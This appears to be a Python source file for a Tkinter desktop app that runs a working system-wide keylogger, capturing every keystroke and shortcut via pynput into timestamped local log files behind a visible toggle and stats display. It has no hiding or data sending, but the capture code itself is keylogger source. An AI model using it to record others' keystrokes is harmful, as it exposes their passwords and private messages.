"""
gui.py
------
A dark-themed Tkinter GUI for the KeyLogger.

Features:
  - Animated toggle switch to start / stop logging
  - Custom log directory picker
  - Live keystroke counter & elapsed timer
  - System-wide capture (pynput works outside the terminal)
  - Auto-opens the log folder when logging stops
"""

import os
import sys
import time
import threading
import tkinter as tk
from tkinter import filedialog, messagebox
from datetime import datetime
from pynput import keyboard

# ── Configuration defaults ────────────────────────────────────────────────────

DEFAULT_LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
FLUSH_INTERVAL  = 5   # seconds between auto-flushes to disk

# ── Modifier key sets ────────────────────────────────────────────────────────

MODIFIER_KEYS = {
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,  keyboard.Key.alt_r,
    keyboard.Key.shift,  keyboard.Key.shift_r,
    keyboard.Key.cmd,    keyboard.Key.cmd_r if hasattr(keyboard.Key, 'cmd_r') else keyboard.Key.cmd,
}

# ── Special-key display map (non-modifier named keys) ─────────────────────────

SPECIAL_KEY_MAP = {
    keyboard.Key.space:        " ",
    keyboard.Key.enter:        "\n[ENTER]\n",
    keyboard.Key.tab:          "TAB",
    keyboard.Key.backspace:    "BACKSPACE",
    keyboard.Key.delete:       "DELETE",
    keyboard.Key.esc:          "ESC",
    keyboard.Key.caps_lock:    "CAPS LOCK",
    keyboard.Key.up:           "↑",
    keyboard.Key.down:         "↓",
    keyboard.Key.left:         "←",
    keyboard.Key.right:        "→",
    keyboard.Key.home:         "HOME",
    keyboard.Key.end:          "END",
    keyboard.Key.page_up:      "PGUP",
    keyboard.Key.page_down:    "PGDN",
    keyboard.Key.insert:       "INSERT",
    keyboard.Key.print_screen: "PRTSC",
    keyboard.Key.pause:        "PAUSE",
    keyboard.Key.num_lock:     "NUMLOCK",
    keyboard.Key.scroll_lock:  "SCROLLOCK",
    keyboard.Key.f1:  "F1",  keyboard.Key.f2:  "F2",
    keyboard.Key.f3:  "F3",  keyboard.Key.f4:  "F4",
    keyboard.Key.f5:  "F5",  keyboard.Key.f6:  "F6",
    keyboard.Key.f7:  "F7",  keyboard.Key.f8:  "F8",
    keyboard.Key.f9:  "F9",  keyboard.Key.f10: "F10",
    keyboard.Key.f11: "F11", keyboard.Key.f12: "F12",
}

# Map modifier keys -> label used in combo strings
MODIFIER_LABELS = {
    keyboard.Key.ctrl_l:  "CTRL",
    keyboard.Key.ctrl_r:  "CTRL",
    keyboard.Key.alt_l:   "ALT",
    keyboard.Key.alt_r:   "ALT",
    keyboard.Key.shift:   "SHIFT",
    keyboard.Key.shift_r: "SHIFT",
    keyboard.Key.cmd:     "WIN",
}

# ── KeyLogger core ────────────────────────────────────────────────────────────

class KeyLogger:
    def __init__(self, log_dir: str, on_keystroke=None):
        self.log_dir      = log_dir
        self.on_keystroke = on_keystroke   # callback(count: int)
        self._buffer: list[str] = []
        self._lock        = threading.Lock()
        self._stop        = threading.Event()
        self._listener    = None
        self._log_path    = ""
        self.keystroke_count = 0
        # Track currently held modifier keys
        self._held_modifiers: set = set()

    def _create_log_file(self) -> str:
        os.makedirs(self.log_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
        path = os.path.join(self.log_dir, f"keylog_{timestamp}.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"{'='*60}\n")
            f.write(f"  KeyLogger Session Started\n")
            f.write(f"  {datetime.now().strftime('%A, %B %d %Y  %I:%M:%S %p')}\n")
            f.write(f"{'='*60}\n\n")
        return path

    def _get_base_label(self, key) -> str:
        """Return the human-readable label for a non-modifier key."""
        # Named special key (tab, enter, arrows, Fn…)
        if key in SPECIAL_KEY_MAP:
            return SPECIAL_KEY_MAP[key]
        # Regular character key
        try:
            ch = key.char
            if ch is None:
                return str(key)
            # Control characters: Ctrl+A → \x01, etc.
            if ord(ch) < 32:
                return chr(ord(ch) + 64)   # \x01 → 'A', \x03 → 'C', …
            return ch
        except AttributeError:
            return str(key)

    def _active_modifier_labels(self) -> list[str]:
        """Deduplicated, ordered list of held modifier labels."""
        seen = set()
        result = []
        # Fixed priority order: CTRL → ALT → SHIFT → WIN
        priority = [
            keyboard.Key.ctrl_l,  keyboard.Key.ctrl_r,
            keyboard.Key.alt_l,   keyboard.Key.alt_r,
            keyboard.Key.shift,   keyboard.Key.shift_r,
            keyboard.Key.cmd,
        ]
        for mk in priority:
            if mk in self._held_modifiers:
                label = MODIFIER_LABELS.get(mk, str(mk))
                if label not in seen:
                    seen.add(label)
                    result.append(label)
        return result

    def _on_press(self, key):
        # Update modifier state first
        if key in MODIFIER_LABELS:
            self._held_modifiers.add(key)
            return   # don't log bare modifier key-down events

        base  = self._get_base_label(key)
        mods  = self._active_modifier_labels()

        if mods:
            # Shortcut combo — always bracket it
            combo = "+".join(mods + [base.upper() if len(base) == 1 else base])
            char  = f"[{combo}]"
        else:
            # Plain key
            if base in ("\n[ENTER]\n",):
                char = base
            elif len(base) > 1:
                char = f"[{base}]"
            else:
                char = base

        with self._lock:
            self._buffer.append(char)
            self.keystroke_count += 1
        if self.on_keystroke:
            self.on_keystroke(self.keystroke_count)

    def _on_release(self, key):
        """Remove modifier from held set when released."""
        self._held_modifiers.discard(key)

    def _flush(self):
        with self._lock:
            if not self._buffer:
                return
            content = "".join(self._buffer)
            self._buffer.clear()
        with open(self._log_path, "a", encoding="utf-8") as f:
            f.write(content)

    def _auto_flush_loop(self):
        while not self._stop.is_set():
            self._stop.wait(timeout=FLUSH_INTERVAL)
            self._flush()

    def _write_footer(self):
        with open(self._log_path, "a", encoding="utf-8") as f:
            f.write(f"\n\n{'='*60}\n")
            f.write(f"  Session Ended\n")
            f.write(f"  {datetime.now().strftime('%A, %B %d %Y  %I:%M:%S %p')}\n")
            f.write(f"  Total Keystrokes: {self.keystroke_count}\n")
            f.write(f"{'='*60}\n")

    def start(self):
        self._stop.clear()
        self.keystroke_count = 0
        self._buffer.clear()
        self._held_modifiers.clear()
        self._log_path = self._create_log_file()
        threading.Thread(target=self._auto_flush_loop, daemon=True).start()
        self._listener = keyboard.Listener(
            on_press=self._on_press,
            on_release=self._on_release,
        )
        self._listener.start()
        return self._log_path

    def stop(self):
        self._stop.set()
        if self._listener:
            self._listener.stop()
            self._listener = None
        self._flush()
        self._write_footer()
        return self._log_path

# ── Colour palette ────────────────────────────────────────────────────────────

BG        = "#0f1117"
CARD      = "#1a1d27"
BORDER    = "#2a2d3a"
ACCENT    = "#6c63ff"
ACCENT2   = "#a78bfa"
TEXT      = "#e2e8f0"
SUBTEXT   = "#94a3b8"
SUCCESS   = "#22c55e"
DANGER    = "#ef4444"
WARN      = "#f59e0b"

# ── Animated Toggle ───────────────────────────────────────────────────────────

class ToggleSwitch(tk.Canvas):
    W, H = 80, 40
    KNOB_R = 16

    def __init__(self, parent, command=None, **kw):
        super().__init__(parent, width=self.W, height=self.H,
                         bg=CARD, highlightthickness=0, **kw)
        self._on      = False
        self._command = command
        self._anim_x  = self.KNOB_R + 4          # current knob x
        self._target_x = self._anim_x
        self._draw()
        self.bind("<Button-1>", self._clicked)

    def _draw(self):
        self.delete("all")
        color = SUCCESS if self._on else BORDER
        # track
        self.create_rounded_rect(2, 2, self.W-2, self.H-2, radius=self.H//2, fill=color)
        cx, cy = self._anim_x, self.H // 2
        # knob
        self.create_oval(cx-self.KNOB_R, cy-self.KNOB_R,
                         cx+self.KNOB_R, cy+self.KNOB_R,
                         fill="white", outline="")

    def create_rounded_rect(self, x1, y1, x2, y2, radius=10, **kw):
        pts = [x1+radius, y1,
               x2-radius, y1,
               x2, y1,
               x2, y1+radius,
               x2, y2-radius,
               x2, y2,
               x2-radius, y2,
               x1+radius, y2,
               x1, y2,
               x1, y2-radius,
               x1, y1+radius,
               x1, y1]
        return self.create_polygon(pts, smooth=True, **kw)

    def _clicked(self, _=None):
        self._on = not self._on
        self._target_x = (self.W - self.KNOB_R - 4) if self._on else (self.KNOB_R + 4)
        self._animate()
        if self._command:
            self._command(self._on)

    def _animate(self):
        diff = self._target_x - self._anim_x
        if abs(diff) < 1:
            self._anim_x = self._target_x
            self._draw()
            return
        self._anim_x += diff * 0.25
        self._draw()
        self.after(16, self._animate)

    @property
    def value(self):
        return self._on

    def force_off(self):
        """Turn off without triggering command."""
        self._on = False
        self._target_x = self.KNOB_R + 4
        self._animate()

# ── Main App ──────────────────────────────────────────────────────────────────

class App(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("KeyLogger")
        self.resizable(False, False)
        self.configure(bg=BG)

        # center window
        w, h = 500, 560
        sw, sh = self.winfo_screenwidth(), self.winfo_screenheight()
        self.geometry(f"{w}x{h}+{(sw-w)//2}+{(sh-h)//2}")

        self._logger: KeyLogger | None = None
        self._active  = False
        self._start_t = 0
        self._log_dir = tk.StringVar(value=DEFAULT_LOG_DIR)
        self._current_log = ""

        self._build_ui()
        self._tick()

    # ── UI construction ───────────────────────────────────────────────────────

    def _build_ui(self):
        # ── Header ────────────────────────────────────────────────────────────
        hdr = tk.Frame(self, bg=BG)
        hdr.pack(fill="x", padx=28, pady=(28, 0))

        tk.Label(hdr, text="⌨  KeyLogger", font=("Segoe UI", 22, "bold"),
                 fg=TEXT, bg=BG).pack(side="left")

        self._dot = tk.Label(hdr, text="●", font=("Segoe UI", 14),
                             fg=BORDER, bg=BG)
        self._dot.pack(side="right", pady=6)

        # ── Card: Toggle ──────────────────────────────────────────────────────
        self._toggle_card = self._card(pady_top=20)

        tk.Label(self._toggle_card, text="Capture Keystrokes",
                 font=("Segoe UI", 14, "bold"), fg=TEXT, bg=CARD).grid(
                 row=0, column=0, sticky="w")

        tk.Label(self._toggle_card, text="Logs every key pressed system-wide",
                 font=("Segoe UI", 10), fg=SUBTEXT, bg=CARD).grid(
                 row=1, column=0, sticky="w", pady=(2, 0))

        self._toggle = ToggleSwitch(self._toggle_card, command=self._on_toggle)
        self._toggle.grid(row=0, column=1, rowspan=2, padx=(20, 0), sticky="e")
        self._toggle_card.columnconfigure(0, weight=1)

        self._status_lbl = tk.Label(self._toggle_card, text="Inactive",
                                    font=("Segoe UI", 10, "italic"),
                                    fg=SUBTEXT, bg=CARD)
        self._status_lbl.grid(row=2, column=0, columnspan=2, sticky="w", pady=(10, 0))

        # ── Card: Log Directory ───────────────────────────────────────────────
        dir_card = self._card(pady_top=12)
        tk.Label(dir_card, text="Log Directory",
                 font=("Segoe UI", 12, "bold"), fg=TEXT, bg=CARD).pack(anchor="w")
        tk.Label(dir_card, text="Choose where log files are saved",
                 font=("Segoe UI", 10), fg=SUBTEXT, bg=CARD).pack(anchor="w", pady=(2, 10))

        row = tk.Frame(dir_card, bg=CARD)
        row.pack(fill="x")

        path_frame = tk.Frame(row, bg=BORDER, bd=0)
        path_frame.pack(side="left", fill="x", expand=True)
        self._path_entry = tk.Entry(path_frame, textvariable=self._log_dir,
                                    font=("Consolas", 9), fg=TEXT,
                                    bg="#252836", insertbackground=TEXT,
                                    relief="flat", bd=6)
        self._path_entry.pack(fill="x")

        browse_btn = tk.Button(row, text="  Browse  ", font=("Segoe UI", 10),
                               bg=ACCENT, fg="white", activebackground=ACCENT2,
                               activeforeground="white", relief="flat", bd=0,
                               cursor="hand2", command=self._browse)
        browse_btn.pack(side="left", padx=(8, 0), ipady=6)

        # ── Card: Live Stats ──────────────────────────────────────────────────
        stats_card = self._card(pady_top=12)
        tk.Label(stats_card, text="Live Stats",
                 font=("Segoe UI", 12, "bold"), fg=TEXT, bg=CARD).pack(anchor="w", pady=(0, 10))

        stats_row = tk.Frame(stats_card, bg=CARD)
        stats_row.pack(fill="x")

        self._keys_val  = self._stat_box(stats_row, "0",      "Keystrokes")
        self._time_val  = self._stat_box(stats_row, "00:00",  "Elapsed")
        self._file_icon = self._stat_box(stats_row, "—",      "Log File")

        # ── Card: Log Path Display ────────────────────────────────────────────
        log_card = self._card(pady_top=12)
        tk.Label(log_card, text="Current Log File",
                 font=("Segoe UI", 12, "bold"), fg=TEXT, bg=CARD).pack(anchor="w")
        self._log_path_lbl = tk.Label(log_card, text="No active session",
                                      font=("Consolas", 8), fg=SUBTEXT,
                                      bg=CARD, wraplength=420, justify="left")
        self._log_path_lbl.pack(anchor="w", pady=(6, 0))

        open_btn = tk.Button(log_card, text="📂  Open Log Folder",
                             font=("Segoe UI", 10), bg=CARD, fg=SUBTEXT,
                             activebackground=BORDER, activeforeground=TEXT,
                             relief="flat", bd=0, cursor="hand2",
                             command=self._open_folder)
        open_btn.pack(anchor="w", pady=(8, 0))

        # ── Footer ────────────────────────────────────────────────────────────
        tk.Label(self, text="System-wide capture  •  Auto-flush every 5 s",
                 font=("Segoe UI", 9), fg=SUBTEXT, bg=BG).pack(pady=(10, 0))

    def _card(self, pady_top=20) -> tk.Frame:
        outer = tk.Frame(self, bg=BORDER, bd=0)
        outer.pack(fill="x", padx=24, pady=(pady_top, 0), ipady=1, ipadx=1)
        inner = tk.Frame(outer, bg=CARD, bd=0)
        inner.pack(fill="both", padx=1, pady=1)
        pad = tk.Frame(inner, bg=CARD)
        pad.pack(fill="both", padx=18, pady=16)
        return pad

    def _stat_box(self, parent, value, label) -> tk.Label:
        box = tk.Frame(parent, bg="#252836", bd=0)
        box.pack(side="left", fill="x", expand=True, padx=(0, 8))
        val_lbl = tk.Label(box, text=value, font=("Segoe UI", 18, "bold"),
                           fg=ACCENT2, bg="#252836")
        val_lbl.pack(pady=(10, 2))
        tk.Label(box, text=label, font=("Segoe UI", 9), fg=SUBTEXT,
                 bg="#252836").pack(pady=(0, 10))
        return val_lbl

    # ── Event handlers ────────────────────────────────────────────────────────

    def _browse(self):
        chosen = filedialog.askdirectory(title="Select Log Directory",
                                         initialdir=self._log_dir.get())
        if chosen:
            self._log_dir.set(chosen)

    def _on_toggle(self, state: bool):
        if state:
            self._start_logging()
        else:
            self._stop_logging()

    def _start_logging(self):
        log_dir = self._log_dir.get().strip()
        if not log_dir:
            messagebox.showerror("Error", "Please select a log directory first.")
            self._toggle.force_off()
            return

        self._logger = KeyLogger(log_dir=log_dir,
                                 on_keystroke=self._on_key_count)
        self._current_log = self._logger.start()
        self._active  = True
        self._start_t = time.time()

        # update UI
        self._dot.config(fg=SUCCESS)
        self._status_lbl.config(text="● Recording…", fg=SUCCESS)
        self._log_path_lbl.config(text=self._current_log, fg=ACCENT2)
        self._file_icon.config(text="●", fg=SUCCESS)

    def _stop_logging(self):
        if self._logger:
            self._current_log = self._logger.stop()
            self._logger = None
        self._active = False

        # update UI
        self._dot.config(fg=BORDER)
        self._status_lbl.config(text="Inactive — session saved", fg=SUBTEXT)
        self._log_path_lbl.config(text=self._current_log or "No active session",
                                   fg=SUBTEXT)
        self._file_icon.config(text="✓", fg=SUCCESS)

    def _on_key_count(self, count: int):
        # called from pynput thread — schedule UI update on main thread
        self.after(0, lambda: self._keys_val.config(text=str(count)))

    def _open_folder(self):
        folder = self._log_dir.get() or DEFAULT_LOG_DIR
        if os.path.isdir(folder):
            os.startfile(folder)
        else:
            messagebox.showinfo("Info", f"Directory does not exist yet:\n{folder}")

    # ── Clock tick ────────────────────────────────────────────────────────────

    def _tick(self):
        if self._active:
            elapsed = int(time.time() - self._start_t)
            m, s = divmod(elapsed, 60)
            self._time_val.config(text=f"{m:02d}:{s:02d}")
            # pulse dot
            current = self._dot.cget("fg")
            self._dot.config(fg=SUCCESS if current == BORDER else BORDER)
        self.after(500, self._tick)

    # ── Close handling ────────────────────────────────────────────────────────

    def destroy(self):
        if self._active and self._logger:
            self._logger.stop()
        super().destroy()


# ── Entry ─────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    app = App()
    app.mainloop()
